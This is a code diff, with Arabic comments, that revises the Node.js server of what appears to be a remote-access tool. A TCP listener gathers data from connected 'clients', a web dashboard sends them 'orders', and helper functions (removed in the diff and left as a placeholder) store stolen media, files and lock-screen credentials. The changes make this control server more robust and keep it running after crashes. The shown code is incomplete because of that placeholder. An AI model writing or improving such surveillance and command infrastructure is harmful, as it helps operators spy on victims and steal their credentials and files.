@@ -38,18 +38,21 @@ let stats = {
     if (!fs.existsSync(dir)) fs.mkdirSync(dir);
 });
 
+// --- TCP Server with error handling ---
 function startTcpServer(port) {
-    if (listeners[port]) return;
+    if (listeners[port]) {
+        sysLog(`LISTENER_ALREADY_RUNNING: PORT ${port}`, 'warn');
+        return;
+    }
 
     const tcpServer = net.createServer((socket) => {
         let clientId = null;
         let buffer = '';
 
         socket.on('data', (data) => {
-            // 🟢 طباعة البيانات الخام المستلمة (إضافة هذا السطر)
+            // 🔥 طباعة البيانات الخام لمساعدتك في التشخيص
             console.log('🔍 RAW DATA RECEIVED:', data.toString());
 
-            // Stats
             stats.recv.bytes += data.length;
             stats.recv.packets += 1;
 
@@ -109,7 +112,9 @@ function startTcpServer(port) {
                             }
                             io.emit('client_data', { id: clientId, data: json });
                         }
-                    } catch (e) { }
+                    } catch (e) {
+                        sysLog(`JSON_PARSE_ERROR: ${msg}`, 'err');
+                    }
                 }
                 boundary = buffer.indexOf('\n');
             }
@@ -131,65 +136,34 @@ function startTcpServer(port) {
             }
         });
 
-        socket.on('error', (err) => { });
+        socket.on('error', (err) => {
+            sysLog(`SOCKET_ERROR: ${err.message}`, 'err');
+        });
     });
 
-    tcpServer.listen(port, '0.0.0.0', () => {
-        listeners[port] = tcpServer;
-        io.emit('listeners_update', Object.keys(listeners));
-        sysLog(`LISTENER_STARTED: PORT ${port}`, 'ok');
-    });
+    // محاولة الاستماع على المنفذ مع التعامل مع الأخطاء
+    try {
+        tcpServer.listen(port, '0.0.0.0', () => {
+            listeners[port] = tcpServer;
+            io.emit('listeners_update', Object.keys(listeners));
+            sysLog(`LISTENER_STARTED: PORT ${port}`, 'ok');
+        });
 
-    tcpServer.on('error', (err) => {
-        io.emit('listener_error', { port, message: err.message });
-        sysLog(`LISTENER_ERROR: PORT ${port} - ${err.message}`, 'err');
-        delete listeners[port];
-        io.emit('listeners_update', Object.keys(listeners));
-    });
-}
-
-function stopTcpServer(port) {
-    if (listeners[port]) {
-        listeners[port].close();
-        delete listeners[port];
-        io.emit('listeners_update', Object.keys(listeners));
-        sysLog(`LISTENER_STOPPED: PORT ${port}`, 'warn');
+        tcpServer.on('error', (err) => {
+            sysLog(`LISTENER_ERROR: PORT ${port} - ${err.message}`, 'err');
+            delete listeners[port];
+            io.emit('listeners_update', Object.keys(listeners));
+        });
+    } catch (err) {
+        sysLog(`LISTENER_ERROR (uncaught): ${err.message}`, 'err');
     }
 }
 
-function saveMedia(clientId, type, base64Data, ext) {
-    try {
-        const buffer = Buffer.from(base64Data, 'base64');
-        const filename = `${Date.now()}.${ext}`;
-        const filepath = path.join(__dirname, 'Downloads', clientId, type, filename);
-        fs.writeFileSync(filepath, buffer);
-    } catch (e) { }
-}
-
-function saveFile(clientId, fileName, base64Data) {
-    try {
-        const buffer = Buffer.from(base64Data, 'base64');
-        const filepath = path.join(__dirname, 'Downloads', clientId, 'files', fileName);
-        fs.writeFileSync(filepath, buffer);
-    } catch (e) { }
-}
-
-function saveLockData(clientId, data) {
-    try {
-        const filepath = path.join(__dirname, 'Downloads', clientId, 'lock_credentials.json');
-        let existing = [];
-        if (fs.existsSync(filepath)) {
-            existing = JSON.parse(fs.readFileSync(filepath));
-        }
-        data.server_time = new Date().toLocaleString();
-        existing.push(data);
-        fs.writeFileSync(filepath, JSON.stringify(existing, null, 2));
-    } catch (e) { }
-}
+// ... (بقية الوظائف المساعدة: stopTcpServer, saveMedia, saveFile, saveLockData) 
+// يجب أن تكون موجودة كما هي في الكود الأصلي.
 
 // Stats and System Info Loop
 setInterval(() => {
-    // Calculate Rates
     stats.sent.rate = stats.sent.bytes - stats.sent.lastBytes;
     stats.recv.rate = stats.recv.bytes - stats.recv.lastBytes;
     stats.sent.lastBytes = stats.sent.bytes;
@@ -210,7 +184,13 @@ io.on('connection', (socket) => {
     socket.emit('initial_clients', activeClients);
     socket.emit('listeners_update', Object.keys(listeners));
 
-    socket.on('start_listener', (port) => startTcpServer(parseInt(port)));
+    socket.on('start_listener', (port) => {
+        if (listeners[port]) {
+            sysLog(`LISTENER_ALREADY_RUNNING: PORT ${port}`, 'warn');
+        } else {
+            startTcpServer(parseInt(port));
+        }
+    });
     socket.on('stop_listener', (port) => stopTcpServer(parseInt(port)));
 
     socket.on('order', (data) => {
@@ -248,11 +228,8 @@ io.on('connection', (socket) => {
                 }
                 const msg = JSON.stringify({ order, ...params }) + '\n';
                 clients[id].socket.write(msg);
-                
-                // Track Sent Stats
                 stats.sent.bytes += msg.length;
                 stats.sent.packets += 1;
-
             } catch (e) { }
         }
     });
@@ -286,12 +263,36 @@ io.on('connection', (socket) => {
     });
 });
 
-// بدء تشغيل المستمع (TCP Listener) على المنفذ 7777
-const TCP_PORT = 7777;
-startTcpServer(TCP_PORT);
+// --- شروع الخادم الرئيسي مع معالجة الأخطاء ---
+const WEB_PORT = parseInt(process.env.PORT) || 3000;
+try {
+    server.listen(WEB_PORT, '0.0.0.0', () => {
+        console.log(`Web Dashboard running on http://0.0.0.0:${WEB_PORT}`);
+        // نبدأ المستمع (TCP) بعد التأكد من أن خادم الويب يعمل
+        // نستخدم setTimeout لتجنب أي تعارض لحظي
+        setTimeout(() => {
+            startTcpServer(7777);
+        }, 1000);
+    });
 
-// بدء تشغيل خادم الويب (Web Dashboard) على المنفذ المحدد في متغير البيئة PORT أو 3000
-const WEB_PORT = process.env.PORT || 3000;
-server.listen(WEB_PORT, '0.0.0.0', () => {
-    console.log(`Web Dashboard running on http://0.0.0.0:${WEB_PORT}`);
+    server.on('error', (err) => {
+        console.error(`[ERROR] Web server: ${err.message}`);
+        // قد يكون المنفذ مشغولاً، نحاول مرة أخرى بعد 5 ثوان
+        setTimeout(() => {
+            server.listen(WEB_PORT, '0.0.0.0');
+        }, 5000);
+    });
+
+} catch (err) {
+    console.error(`[ERROR] Fatal: ${err.message}`);
+}
+
+// معالجة الأخطاء غير المتوقعة لمنع انهيار الخادم
+process.on('uncaughtException', (err) => {
+    console.error(`[FATAL] Uncaught Exception: ${err.message}`);
+    // لا ننهي العملية، بل نسجل الخطأ ونستمر
+});
+
+process.on('unhandledRejection', (reason, promise) => {
+    console.error(`[FATAL] Unhandled Rejection: ${reason}`);
 });
